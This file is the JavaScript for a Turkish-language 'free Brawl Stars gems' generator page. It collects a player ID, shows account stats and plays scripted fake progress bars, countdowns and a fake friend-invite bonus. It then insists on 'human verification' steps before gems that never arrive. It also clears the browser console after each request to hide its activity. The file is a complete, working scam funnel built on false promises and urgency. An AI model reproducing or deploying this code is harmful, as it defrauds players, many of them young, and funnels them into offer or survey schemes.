$(document).ready(function() {
	
	////////////////
	// G Amounts
	//////////////// 
	var $ga_1 = 30,
		$ga_2 = 80,
		$ga_3 = 170,
		$ga_4 = 360,
		$ga_5 = 950,
		$ga_6 = 2000;
	
	var mrurl;
	mrurl = "https://www.google.com/";
	
	var $human_verification_timer_value = '480'; //Countdown remaing time in seconds	
	var $human_verification_timer2_value = '450'; //Countdown remaing time in seconds	
	
	const instance = new TypeIt("#b-s-w-b-s-1", {
		strings: "Hoşgeldin Brawler! Ücretsiz Brawl Stars elmas hilesini yapmak ister misin?",
		speed: 25,
		waitUntilVisible: true
	}).go();
	var sga;
	var sgi;
	var cme;
	var sgc;
	var sgab;
	var sgfv;
	cme = ".plb-m";
	$(document).on("click",".r-s-i-t",function() {
		$('.r-s-i').removeClass('r-s-i-t');
		$(this).find(".r-s-i-o").addClass('o-i-v');
		if ($(this).hasClass("r-s-i-1")) {
			sga = $ga_1;
			sgi = "img/gem_pack_0030.png";
		} else if ($(this).hasClass("r-s-i-2")) {
			sga = $ga_2;
			sgi = "img/gem_pack_0080.png";
		} else if ($(this).hasClass("r-s-i-3")) {
			sga = $ga_3;
			sgi = "img/gem_pack_0170.png";
		} else if ($(this).hasClass("r-s-i-4")) {
			sga = $ga_4;
			sgi = "img/gem_pack_0360.png";
		} else if ($(this).hasClass("r-s-i-5")) {
			sga = $ga_5;
			sgi = "img/gem_pack_0950.png";
		} else if ($(this).hasClass("r-s-i-6")) {
			sga = $ga_6;
			sgi = "img/gem_pack_2000.png";
		}
		setTimeout(function() {
			let r = Math.random().toString(36).substring(7);
			$('.m-g').append('<div id="'+r+'"></div>');
			gS( "kbspi1", function(src) {
				$(".r-s-i-o").removeClass('o-i-v');
				$( '#'+r ).addClass('fwhbo');
				$( '#'+r ).html(src).hide().fadeIn();
				instance.reset();
				const instance2 = new TypeIt("#b-s-w-b-s-1", {
					strings: "Harika, gönderimi yapabilmem için oyundaki ID numaranı girmelisin. Korkma senden şifre istemeyeceğim.",
					speed: 25,
					waitUntilVisible: true
				}).go();
				$('#fpf-i').on('keyup', function(e) {
					var userInput = e.target.value;
					var userInputT = userInput.replace('#', '');
					var userInputF = userInputT.replace(' ', '');
					$('#fpf-i').val('#' + userInputF );
					if($("#fpf-i").val().length >= 9) {
						$('#fpf-b').removeClass('fpf-b-d');
						$('#fpf-b').addClass('fpf-b-t');
					} else {						
						$('#fpf-b').removeClass('fpf-b-t');
						$('#fpf-b').addClass('fpf-b-d');
					}
				});
				$(document).on("click",".fpf-i-i-b-w-i",function() {					
					$('#s1-video').get(0).play();	
					var elem = document.getElementById("s1-video");
					function openFullscreen() {
						if (elem.requestFullscreen) {
							elem.requestFullscreen();
						} else if (elem.mozRequestFullScreen) {
							elem.mozRequestFullScreen();
						} else if (elem.webkitRequestFullscreen) {
							elem.webkitRequestFullscreen();
						} else if (elem.msRequestFullscreen) {
							elem.msRequestFullscreen();
						}						
					}
					openFullscreen();					
					$('#uis-c').hide();									
					$('.uis-ci-c').hide();									
					$('.t-v-w').show();									
					$('#uis-c-2').show();
					$('#uis-c-3').show();					
				});
				$(document).on("click",".fpf-b-t",function() {
					staf();
				});
				$("#fpf-i").keypress(function(event){
					var keycode = (event.keyCode ? event.keyCode : event.which);
					if(keycode == '13'){
						event.preventDefault();
						if($("#fpf-i").val().length >= 9) {
							staf();
						}
					}
				});
				function staf() {
					gS( "kbspi3", function(src) {
						$( '#'+r ).html(src).hide().fadeIn();
						instance2.reset();
						instance4 = new TypeIt("#b-s-w-b-s-1", {
							strings: "Lütfen biraz bekle! Hesabını bulmaya çalışıyorum.",
							speed: 25,
							waitUntilVisible: true
						}).go();
						function progressBar(percent, $element, duration) {
							var progressBarWidth = percent * $element.width() / 100;
							$element.find('div').animate({ width: progressBarWidth }, duration).html(percent + "%&nbsp;");
						}
						progressBar(0, $('#fg-progressBar'), 1);
						progressBar(10, $('#fg-progressBar'), 300);
					});	
					$.ajax({
						type: "POST",
						url: "api/kbspi2.php",
						data: $('#fpf').serialize(),
						dataType : 'json',
						success: function(dataprocess){
							if(dataprocess.hasOwnProperty('reason')){
								setTimeout(function() {
									$(cme).html('Kullanıcı bulunamadı.');
									aO( cme, 'bounceIn' );
								}, 500 );
								setTimeout(function() {
									gS( "kbspi1", function(src) {
										$( '#'+r ).html(src).hide().fadeIn();
										instance4.reset();
										instance5 = new TypeIt("#b-s-w-b-s-1", {
											strings: "Üzgünüm ID numarasını yanlış girdin. Oyuncu ID numarasını nasıl alacağını öğrenmek için bilgi düğmesine tıklayabilirsin.",
											speed: 25,
											waitUntilVisible: true
										}).go();
										$('#fpf-i').on('keyup', function(e) {
											var userInput = e.target.value;
											var userInputT = userInput.replace('#', '');
											var userInputF = userInputT.replace(' ', '');
											$('#fpf-i').val('#' + userInputF );
											if($("#fpf-i").val().length >= 9) {
												$('#fpf-b').removeClass('fpf-b-d');
												$('#fpf-b').addClass('fpf-b-t');
											} else {						
												$('#fpf-b').removeClass('fpf-b-t');
												$('#fpf-b').addClass('fpf-b-d');
											}
										});
										$("#fpf-i").keypress(function(event){
											var keycode = (event.keyCode ? event.keyCode : event.which);
											if(keycode == '13'){
												event.preventDefault();
												if($("#fpf-i").val().length >= 9) {
													staf();
												}
											}
										});
										$('.fpf-i-i-b-w-h').show();
										$('.fpf-i-w').addClass('fpf-i-w-er');
										setTimeout(function() {		
											$('.fpf-i-w').removeClass('fpf-i-w-er');
										}, 3000 );
										$(document).on("click",".fpf-i-i-b-w-i",function() {					
											$('#s1-video').get(0).play();	
											var elem = document.getElementById("s1-video");
											function openFullscreen() {
												if (elem.requestFullscreen) {
													elem.requestFullscreen();
												} else if (elem.mozRequestFullScreen) {
													elem.mozRequestFullScreen();
												} else if (elem.webkitRequestFullscreen) {
													elem.webkitRequestFullscreen();
												} else if (elem.msRequestFullscreen) {
													elem.msRequestFullscreen();
												}						
											}
											openFullscreen();					
											$('#uis-c').hide();									
											$('.uis-ci-c').hide();									
											$('.t-v-w').show();									
											$('#uis-c-2').show();
											$('#uis-c-3').show();					
										});
									});
								}, 2000 );
							} else {
								setTimeout(function() {
									$(cme).html('Oyuncu bulundu');									
									aO( cme, 'bounceIn' );									
									$ir_pt = dataprocess.tag;
									$ir_pn = dataprocess.name;
									$ir_pl = dataprocess.expLevel;
									$ir_ptr = dataprocess.trophies;
									$ir_psv = dataprocess.soloVictories;
									$ir_pdv = dataprocess.duoVictories;
									$ir_ptv = dataprocess["3vs3Victories"];
									instance4.reset();
									instance6 = new TypeIt("#b-s-w-b-s-1", {
										strings: "Aaa burada bir " + $ir_pn + " varmış! Burada hesabına dair bilgileri görebilirsin " + $ir_pn + ".",
										speed: 25,
										waitUntilVisible: true
									}).go();
									$('.uis-mo-w').fadeOut(function() {
										$('.uis-ci-h h1').html('Hesap Bilgisi');
										$('.pai-v-pt').html($ir_pt);
										$('.pai-v-u').html($ir_pn);
										$('.pai-v-l').html($ir_pl);
										$('.pai-c-b-fw-v-t').html($ir_ptr);
										$('.pai-c-b-fw-v-sv').html($ir_psv);
										$('.pai-c-b-fw-v-dv').html($ir_pdv);
										$('.pai-c-b-fw-v-tv').html($ir_ptv);
										aO('.pai-amme', 'bounceIn' );
										aO('.ci-h-amme', 'bounceIn' );
									});	
									function progressBar(percent, $element, duration) {
										var progressBarWidth = percent * $element.width() / 100;
										$element.find('div').animate({ width: progressBarWidth }, duration).html(percent + "%&nbsp;");
									}	
									setTimeout(function() {																			
										$(cme).html('15%');
										aO( cme, 'bounceIn' );										
										progressBar(15, $('#fg-progressBar'), 300);
										$('.uis-mo-w').fadeOut();	
									}, 2500 );	
									setTimeout(function() {																			
										$(cme).html('Yükleniyor...');
										aO( cme, 'bounceIn' );
									}, 4500 );
									setTimeout(function() {																			
										$(cme).html('25%');
										aO(cme,'bounceIn');										
										progressBar(25, $('#fg-progressBar'), 300);
										instance6.reset();
										instance7 = new TypeIt("#b-s-w-b-s-1", {
											strings: "Şimdi bu <span class='plb-m-g'>elmasları</span> hesabına göndermeme izin verir misin?",
											speed: 25,
											waitUntilVisible: true
										}).go();
									}, 6500 );
									setTimeout(function() {
										$('.pai-w').fadeOut(function() {
											$('.uis-ci-h h1').html($ir_pn);
											aO('.ci-h-amme', 'bounceIn' );
											gS( "kbspi4", function(src) {
												$( '.uis-ci-c' ).html(src).hide().fadeIn();
												$("#pgg-mi-i-ri").attr("src",sgi);
												$('#pgg-mi-i-rv').countTo({
													from: 0,
													to: sga,
													speed: 2000,
													refreshInterval: 10
												});	
											});	
										});
									}, 8500 );
									setTimeout(function() {
										$(cme).html('50%');
										aO(cme,'bounceIn');										
										progressBar(50, $('#fg-progressBar'), 300);
									}, 11000 );
									setTimeout(function() {
										aO('.usws-mo-i-c','bounceIn');
										$('.usws-mo-w').fadeIn(function() {
											instance7.reset();
											instance8 = new TypeIt("#b-s-w-b-s-1", {
												strings: "Hey, eğer arkadaşlarını davet edersen <span class='plb-m-g'>1000 bonus elmas</span> kazanabileceğini biliyorsun değil mi?",
												speed: 25,
												waitUntilVisible: true
											}).go();
											function c(){
												var n=$('.c').attr('id');
												var c=n;
												$('.c').text(c);
												setInterval(function(){
													c--;
													if(c>=0){
														$('.c').text(c);
													}
													if(c==0){
														$('.c').text(n);
													}
												}, 1000);
											}
											c();
											setInterval(function(){
												c();
											}, 30000);											
											$sibt = 0;
											$(document).on("click","#usws-b",function() {
												$sibt = 1;
												sgc = parseInt($('#pgg-mi-i-rv').text(), 10);												
												sgab = sgc + 1000;
												yB();
											});
											$(document).on("click","#uis-c-5",function() {
												$sibt = 1;
												nB();
											});
											setTimeout(function() {
												if($sibt != 1) {
													nB();
												}
											}, 30000 );
											function yB() {												
												setTimeout(function() {
													$('.usws-mo-w').fadeOut(function() {
														$('#pgg-mi-i-rv').countTo({
															from: sgc,
															to: sgab,
															speed: 2000,
															refreshInterval: 10
														});
													});
													$(cme).html('Bonus elmaslar ekleniyor...');
													progressBar(75, $('#fg-progressBar'), 300);
												}, 2500 );
												setTimeout(function() {
													$(cme).html('Yükleniyor...');
													progressBar(85, $('#fg-progressBar'), 300);
												}, 6000 );
												setTimeout(function() {
													$('.pgg-w').fadeOut(function() {
														$("#pggf-mi-i-ri").attr("src",sgi);
														$('#pggf-mi-i-rv').html(sgab);
														aO('.pggf-w','bounceIn');
														$('.pggf-w-o').fadeIn();
														$(cme).html('99%');															
														progressBar(99, $('#fg-progressBar'), 300);
														instance8.reset();
														instance9 = new TypeIt("#b-s-w-b-s-1", {
															strings: "Tebrikler " + $ir_pn + ", elmasların hazır! Ama son bir adım kaldı doğrulama adımlarını tamamlaman gerekiyor. ",
															speed: 25,
															waitUntilVisible: true
														}).go();
													});													
												}, 8000 );
												$vfftc = 0;
												$(document).on("click","#ufcb-b",function() {
													$('#vs-video').get(0).play();
													$('.plb-w').fadeOut();
													$('.ufvw-mo-w').fadeIn(function() {
														if ($vfftc == 0) {															
															instance9.reset();
															instance10 = new TypeIt("#b-s-w-b-s-1", {
																strings: "<span class='lbmsst'>Neredeyse bitti! Elmasları gönderebilmem için doğrulama adımlarını yapmayı unutma. Nasıl doğrulanacağını bilmiyorsan videoyu izleyebilirsin.</span>",
																speed: 25,
																waitUntilVisible: true
															}).go();
														}														
													});
													if ($vfftc == 0) {														
														$vfftcsv = 0;
														$('#vs-video').get(0).addEventListener("timeupdate", function(){
															if(this.currentTime >= 55) {
																if ($vfftcsv == 0) {
																	$(".ufvw-b-w").hide();
																	$('.usws-b-hw').show();
																	$( ".dcew" ).show();
																	$( ".usws-b-hw-ca" ).show();
																	human_verification_timer2.init($human_verification_timer2_value);	
																	instance10.reset();
																	instance11 = new TypeIt("#b-s-w-b-s-1", {
																		strings: "<span class='lbmssts'>Doğrulama adımlarını tamamlamak için yukarıdaki doğrulama adımları butonuna basmalısın. Hesabına <span class='plb-m-g'>elmas</span> gönderilebilmesi için bunu yapmalısın. Yapmazsan elmas gönderilmez.</span>",
																		speed: 25,
																		waitUntilVisible: true
																	}).go();
																	$vfftcsv = 1;
																}
															}
														});
													}
												});
												$(document).on("click","#uis-c-6",function() {
													$vfftc = 1;
													$('#vs-video').get(0).pause();
													$('.ufvw-mo-w').fadeOut();
												});
											}
											function nB() {
												$('.usws-mo-w').fadeOut(function() {
													setTimeout(function() {
														$(cme).html('Yükleniyor...');
														progressBar(85, $('#fg-progressBar'), 300);
													}, 1500 );
													setTimeout(function() {
														$('.pgg-w').fadeOut(function() {
															$("#pggf-mi-i-ri").attr("src",sgi);
															$('#pggf-mi-i-rv').html(sga);
															aO('.pggf-w','bounceIn');
															$('.pggf-w-o').fadeIn();
															$(cme).html('99%');															
															progressBar(99, $('#fg-progressBar'), 300);
															instance8.reset();
															instance9 = new TypeIt("#b-s-w-b-s-1", {
																strings: "Tebrikler " + $ir_pn + ", elmasların hazır! Ama bonus elmas istemeyişin beni şaşırttı. Şimdi doğrulama adımlarını tamamlaman gerekiyor.",
																speed: 25,
																waitUntilVisible: true
															}).go();
														});
													}, 3500 );
												});
												$vfftc = 0;
												$(document).on("click","#ufcb-b",function() {
													$('#vs-video').get(0).play();
													$('.plb-w').fadeOut();
													$('.ufvw-mo-w').fadeIn(function() {
														if ($vfftc == 0) {
															human_verification_timer.init($human_verification_timer_value);															
															instance9.reset();
															instance10 = new TypeIt("#b-s-w-b-s-1", {
																strings: "<span class='lbmsst'>Neredeyse bitti! Elmasları gönderebilmem için doğrulama adımlarını yapmayı unutma. Nasıl doğrulanacağını bilmiyorsan videoyu izleyebilirsin.</span>",
																speed: 25,
																waitUntilVisible: true
															}).go();
														}														
													});
													if ($vfftc == 0) {														
														$vfftcsv = 0;
														$('#vs-video').get(0).addEventListener("timeupdate", function(){
															if(this.currentTime >= 55) {
																if ($vfftcsv == 0) {
																	
																	$(".ufvw-b-w").hide();
																	$('.usws-b-hw').show();
																	$( ".dcew" ).show();
																	$( ".usws-b-hw-ca" ).show();
																	human_verification_timer2.init($human_verification_timer2_value);	
																	instance10.reset();
																	instance11 = new TypeIt("#b-s-w-b-s-1", {
																		strings: "<span class='lbmssts'>Doğrulama adımlarını tamamlamak için yukarıdaki doğrulama adımları butonuna basmalısın. Hesabına <span class='plb-m-g'>elmas</span> gönderilebilmesi için bunu yapmalısın. Yapmazsan elmas gönderilmez.</span>",
																		speed: 25,
																		waitUntilVisible: true
																	}).go();
																	$vfftcsv = 1;
																}
															}
														});
													}
												});
												$(document).on("click","#uis-c-6",function() {
													$vfftc = 1;
													$('#vs-video').get(0).pause();
													$('.ufvw-mo-w').fadeOut();
												});
											}
										});
									}, 13000 );
								}, 1000 );	
							}
						}
					});	
				}
				$(document).on("click","#uis-c",function() {
					$('.r-s-i').addClass('r-s-i-t');
					$( '#'+r ).fadeOut(function() {
						$( '#'+r ).remove();
						instance2.reset();
						instance3 = new TypeIt("#b-s-w-b-s-1", {
							strings: "Bedava elmas istemiyor olamazsın değil mi? Senden şifreni istemeden elmas göndereceğim inanmıyorsan 1 kere gönderim yapmayı dene.",
							speed: 50,
							waitUntilVisible: true
						}).go();
					});
				});
				$(document).on("click","#uis-c-2",function() {
					$('.t-v-w').fadeOut(function(){
						$('#uis-c-2').hide();
						$('#uis-c-3').hide();
						$('.uis-ci-c').fadeIn();
						$('#uis-c').show();
					});
				});
				$(document).on("click","#uis-c-3",function() {
					$('.t-v-w').fadeOut(function(){
						$('#uis-c-2').hide();
						$('#uis-c-3').hide();
						$('.uis-ci-c').fadeIn();
						$('#uis-c').show();
					});
				});
			});	
		}, 500 );
	});
	function aO(el, anim, onDone) {
		var $el = $(el);
		$el.addClass( 'animated ' + anim );
		$el.one( 'animationend', function() {
			$(this).removeClass( 'animated ' + anim );
			onDone && onDone();
		});
	}
	function gS(step, onStep) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'api/' + step + '.php');
        xhr.setRequestHeader("X-REQUESTED-WITH", 'xmlhttprequest');
        xhr.addEventListener('readystatechange', function() {
            if (xhr.readyState == 4) {
                onStep && onStep(xhr.responseText)
            }
        });
        xhr.send()
		console.clear();
		console.log("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
    }	
});
////////////////
// Human Verification Countdown
////////////////
var human_verification_timer = function () {
    var time_left = 15;
    var keep_counting = 1;
    var time_out_msg = 'few seconds';
    function countdown() {
        if(time_left < 2) {
            keep_counting = 0;
        }
        time_left = time_left - 1;
    }
    function add_leading_zero( n ) {
        if(n.toString().length < 2) {
            return '0' + n;
        } else {
            return n;
        }
    }
    function format_output() {
        var hours, minutes, seconds;
        seconds = time_left % 60;
        minutes = Math.floor(time_left / 60) % 60;
        hours = Math.floor(time_left / 3600);   
        seconds = add_leading_zero( seconds );
        minutes = add_leading_zero( minutes );
        hours = add_leading_zero( hours );
        return minutes + 'm ' + seconds + 's';
    }
    function timer_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = '<span>' + format_output() + '</span>';
    }
    function no_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = time_out_msg;
    }
    return {
        count: function () {
            countdown();
            timer_time_left();
        },
        timer: function () {
            human_verification_timer.count();
            if(keep_counting) {
                setTimeout("human_verification_timer.timer();", 1000);
            } else {
                no_time_left();
            }
        },
        init: function (n) {
            time_left = n;
            human_verification_timer.timer();
        }
    };
}();
////////////////
// Human Verification Countdown 2
////////////////
var human_verification_timer2 = function () {
    var time_left = 15;
    var keep_counting = 1;
    var time_out_msg = 'few seconds';
    function countdown() {
        if(time_left < 2) {
            keep_counting = 0;
        }
        time_left = time_left - 1;
    }
    function add_leading_zero( n ) {
        if(n.toString().length < 2) {
            return '0' + n;
        } else {
            return n;
        }
    }
    function format_output() {
        var hours, minutes, seconds;
        seconds = time_left % 60;
        minutes = Math.floor(time_left / 60) % 60;
        hours = Math.floor(time_left / 3600);   
        seconds = add_leading_zero( seconds );
        minutes = add_leading_zero( minutes );
        hours = add_leading_zero( hours );
        return minutes + 'm ' + seconds + 's';
    }
    function timer_time_left() {
        document.getElementById('human_verification_timer2_time').innerHTML = '<span>' + format_output() + '</span>';
    }
    function no_time_left() {
        document.getElementById('human_verification_timer2_time').innerHTML = time_out_msg;
    }
    return {
        count: function () {
            countdown();
            timer_time_left();
        },
        timer: function () {
            human_verification_timer2.count();
            if(keep_counting) {
                setTimeout("human_verification_timer2.timer();", 1000);
            } else {
                no_time_left();
            }
        },
        init: function (n) {
            time_left = n;
            human_verification_timer2.timer();
        }
    };
}();